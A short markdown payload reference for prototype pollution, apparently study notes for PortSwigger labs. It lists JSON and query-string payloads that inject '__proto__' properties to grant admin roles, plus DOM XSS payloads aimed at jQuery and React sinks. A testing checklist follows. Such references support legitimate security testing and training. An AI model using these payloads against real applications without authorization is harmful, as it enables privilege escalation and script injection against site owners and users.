# Prototype Pollution - Payload Reference

## Server-Side Prototype Pollution

### Detection
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

### Via JSON Body
```json
POST /api/update
{"name": "test", "__proto__": {"role": "admin"}}
```

### Via Query Parameter
```
GET /api?__proto__[role]=admin
GET /api?constructor[prototype][role]=admin
```

## Client-Side Prototype Pollution

### DOM XSS via Prototype Pollution
```javascript
// Pollute Object.prototype
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}

// When app does: element[prop] = value
// It reads polluted innerHTML → XSS
```

### Gadget Chains
```javascript
// jQuery sink
{"__proto__": {"selector": "<img src=x onerror=alert(1)>"}}

// React
{"__proto__": {"dangerouslySetInnerHTML": {"__html": "<img src=x onerror=alert(1)>"}}}
```

## PortSwigger Lab Approach
1. Send JSON with `__proto__` property
2. Check if response reflects the polluted property
3. If reflected → server-side prototype pollution confirmed
4. Look for gadgets (settings, config objects) that can be polluted
5. Chain with XSS or other vulnerabilities

## Detection Checklist
- [ ] Can you add `__proto__` to JSON body?
- [ ] Is it reflected in response?
- [ ] Does it persist (stored)?
- [ ] Can you pollute `constructor.prototype`?
- [ ] Are there client-side gadgets?
